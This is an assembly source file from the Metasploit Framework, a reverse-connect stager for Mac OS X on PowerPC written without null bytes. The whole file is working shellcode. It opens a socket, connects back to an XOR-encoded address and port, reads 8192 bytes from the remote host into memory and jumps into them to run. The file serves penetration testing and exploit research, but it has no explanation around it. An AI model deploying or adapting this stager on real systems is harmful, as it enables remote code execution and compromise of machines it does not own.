;;
;
;        Name: stager_sock_reverse_nf.asm
;   Qualities: Null-Free
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Connects back, reads 8192 bytes, jumps into payload.
;        Socket descriptor is left in r30.
;
;;


.globl _main
.text
_main:

_socket:	
	li		r27, 0x3030 + 97
	subi	r0, r27, 0x3030 + 97 - 97
	subi	r3, r27, 0x3030 + 97 - 2
	subi	r4, r27, 0x3030 + 97 - 1
	subi	r5, r27, 0x3030 + 97 - 6

	.long	0x44ffff02
	xor		r5, r5, r5
	mr		r30, r3

_storeaddr:

	; port - patch the xor word
	li		r25, (0x2211^0x4142)
	xori	r25, r25, 0x4142
	subi	r29, r27, 0x3030 + 97 - 2
	slwi	r29, r29, 16	
	or		r29, r29, r25
	stw		r29, -20(r1)

	; addr - patch the xor dword
	lis		r29, hi16(0x7f000001^0x01020304)
	ori		r29, r29, lo16(0x7f000001^0x01020304)
	lis		r28, hi16(0x01020304)
	ori		r28, r28, lo16(0x01020304)
	xor		r29, r29, r28
	stw		r29, -16(r1)

konnect:
	la		r4, -20(r1)
	subi	r5, r27, 0x3030 + 97 - 16
	subi	r0, r27, 0x3030 + 97 - 98
	mr		r3, r30
	.long	0x44ffff02
	xor		r5, r5, r5
		
reader:
	li		r29, 0x3330
	srawi	r29, r29, 12

	subi	r0, r27, 0x3030 + 97 - 3
	mr		r3, r30
	subi	r4, r1, 8192+44
	li		r5, 8192+44
	mtctr	r4
	.long	0x44ffff02
	xor		r5, r5, r5
	xor.	r5, r5, r5
	blectr
	xor		r5, r5, r5
